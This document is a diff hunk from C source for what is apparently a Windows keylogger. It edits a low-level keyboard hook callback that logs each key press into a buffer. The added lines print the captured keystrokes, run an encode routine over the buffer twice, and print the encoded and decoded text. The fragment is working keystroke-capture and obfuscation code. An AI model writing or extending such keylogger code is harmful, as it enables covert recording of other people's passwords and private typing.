@@ -208,10 +208,15 @@ LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (wasUpdated || wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
         return CallNextHookEx(progContext->hLowLevelKeyHook, nCode, wParam, lParam);
     
-    ERR_CODE ret = addKeyToBuffer(progContext->kLogger, &vkCode);
+    ERR_CODE ret = addKeyPressToBuffer(progContext->kLogger, &vkCode);
     if (ret == ECODE_FULL_BUFF) {
         // do something?
     }
+    printf("%s\n", progContext->kLogger->keyBuffer);
+    encode(progContext->kLogger->keyBuffer);
+    printf("ENCODE: %s\n", progContext->kLogger->keyBuffer);
+    encode(progContext->kLogger->keyBuffer);
+    printf("DECODE: %s\n\n", progContext->kLogger->keyBuffer);
     return CallNextHookEx(progContext->hLowLevelKeyHook, nCode, wParam, lParam);
 }
 
